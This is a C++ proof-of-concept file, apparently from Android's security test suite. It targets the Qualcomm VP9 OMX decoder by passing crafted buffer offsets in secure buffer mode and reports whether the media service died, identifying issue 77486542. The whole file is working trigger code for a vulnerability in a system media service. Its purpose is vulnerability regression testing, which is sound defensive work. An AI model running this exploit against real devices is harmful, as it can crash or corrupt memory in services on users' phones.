/**
 * Copyright (C) 2018 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */
#undef _GNU_SOURCE
#define _GNU_SOURCE
#include <sys/types.h>
#include <sys/wait.h>

#include <android/hidl/allocator/1.0/IAllocator.h>
#include <binder/IPCThreadState.h>
#include <binder/IServiceManager.h>
#include <binder/ProcessState.h>
#include <hidlmemory/mapping.h>
#include <media/IOMX.h>
#include <media/OMXBuffer.h>
#include <media/hardware/HardwareAPI.h>
#include <media/stagefright/OMXClient.h>
#include <media/stagefright/foundation/AString.h>
#include "OMXUtils.h"

using namespace android;
using namespace ::android::hardware::media::omx::V1_0;

typedef hidl::allocator::V1_0::IAllocator IAllocator;
typedef hidl::memory::V1_0::IMemory IHidlMemory;

struct DummyOMXObserver : public BnOMXObserver {
 public:
  DummyOMXObserver() {}

  virtual void onMessages(const std::list<omx_message> &messages __unused) {}

 protected:
  virtual ~DummyOMXObserver() {}
};

struct DeathRecipient : public hardware::hidl_death_recipient {
  DeathRecipient() : mDied(false) {}
  bool mDied;
  virtual void serviceDied(uint64_t,
                           const wp<::android::hidl::base::V1_0::IBase> &) {
    mDied = true;
  }
  bool died() const { return mDied; }
};

extern bool connectOMX_O(sp<IOMX> &omx) {
  OMXClient client;
  status_t err = client.connect();
  if (err != OK) {
    return false;
  }
  omx = client.interface();
  if (omx.get() == NULL) {
    return false;
  }
  return true;
}

void poc() {
  sp<IOMX> service;
  status_t err;
  sp<IOMXNode> omxNode;
  int fenceFd = -1;
  const char *codecName = "OMX.qcom.video.decoder.vp9";

  if (connectOMX_O(service) == false) {
    return;
  }

  sp<DummyOMXObserver> observer = new DummyOMXObserver();

  AString name(codecName);
  err = service->allocateNode(name.c_str(), observer, &omxNode);

  if (err != OK || omxNode == NULL) {
    return;
  }

  sp<DeathRecipient> deathRecipient = new DeathRecipient;
  auto tOmxNode = omxNode->getHalInterface();
  tOmxNode->linkToDeath(deathRecipient, 0);

  omxNode->setPortMode(0, IOMX::PortMode::kPortModePresetSecureBuffer);

  // Initiate transition Loaded->Idle
  err = omxNode->sendCommand(OMX_CommandStateSet, OMX_StateIdle);

  OMX_PARAM_PORTDEFINITIONTYPE def;
  InitOMXParams(&def);
  def.nPortIndex = 0;
  OMX_INDEXTYPE omx_indextype = OMX_IndexParamPortDefinition;
  err = omxNode->getParameter(omx_indextype, &def, sizeof(def));

  int inMemSize = def.nBufferCountActual * def.nBufferSize;
  int inBufferCnt = def.nBufferCountActual;
  int inBufferSize = inMemSize / inBufferCnt;

  InitOMXParams(&def);
  def.nPortIndex = 1;
  err = omxNode->getParameter(omx_indextype, &def, sizeof(def));

  int outMemSize = def.nBufferCountActual * def.nBufferSize;
  int outBufferCnt = def.nBufferCountActual;
  int outBufferSize = outMemSize / outBufferCnt;
  IOMX::buffer_id *outBufferId = new IOMX::buffer_id[outBufferCnt];

  sp<IAllocator> mAllocator;
  mAllocator = IAllocator::getService("ashmem");
  if (mAllocator == nullptr) {
    return;
  }
  struct Buffer {
    IOMX::buffer_id mID;
    hidl_memory mHidlMemory;
    uint32_t mFlags;
  };

  Vector<Buffer> inputBuffers;

  for (int i = 0; i < inBufferCnt; ++i) {
    Buffer buffer;
    buffer.mFlags = 0;
    {
      bool success;
      mAllocator->allocate(inBufferSize,
                           [&success, &buffer](bool s, hidl_memory const &m) {
                             success = s;
                             buffer.mHidlMemory = m;
                           });

      sp<IHidlMemory> hidlMemory = mapMemory(buffer.mHidlMemory);
      if (hidlMemory == nullptr) {
        return;
      }

      for (int i = 0; i < inBufferSize / 4; i++) {
        *(static_cast<int *>(static_cast<void *>(hidlMemory->getPointer())) +
          i) = (int)0x1234567;
      }

      err =
          omxNode->useBuffer(0 /*portIndex*/, buffer.mHidlMemory, &buffer.mID);
      inputBuffers.push(buffer);
    }
  }

  Vector<Buffer> outputBuffers;

  for (int i = 0; i < outBufferCnt; ++i) {
    Buffer buffer;
    buffer.mFlags = 0;
    {
      bool success;
      mAllocator->allocate(outBufferSize,
                           [&success, &buffer](bool s, hidl_memory const &m) {
                             success = s;
                             buffer.mHidlMemory = m;
                           });
      err =
          omxNode->useBuffer(1 /*portIndex*/, buffer.mHidlMemory, &buffer.mID);
      outBufferId[i] = buffer.mID;
      outputBuffers.push(buffer);
    }
  }

  // Initiate transition Idle->Executing
  err = omxNode->sendCommand(OMX_CommandStateSet, OMX_StateExecuting);

  sleep(1);

  for (size_t i = 0; i < inputBuffers.size(); i++) {
    OMX_U32 flags = OMX_BUFFERFLAG_ENDOFFRAME;
    int64_t timeUs = 0x00010001;
    OMXBuffer omxbuffer(inBufferSize / 2 - 8, inBufferSize / 2);
    err = omxNode->emptyBuffer(inputBuffers[i].mID, omxbuffer, flags, timeUs,
                               fenceFd);
  }

  for (size_t i = 0; i < outputBuffers.size(); i++) {
    err = omxNode->fillBuffer(outputBuffers[i].mID, OMXBuffer::sPreset);
  }

  omxNode->freeNode();

  if (deathRecipient->died()) {
    printf("77486542\n");
  }
}

int main() {
#ifndef __LP64__
  // 32-bit only.
  poc();
#endif
}
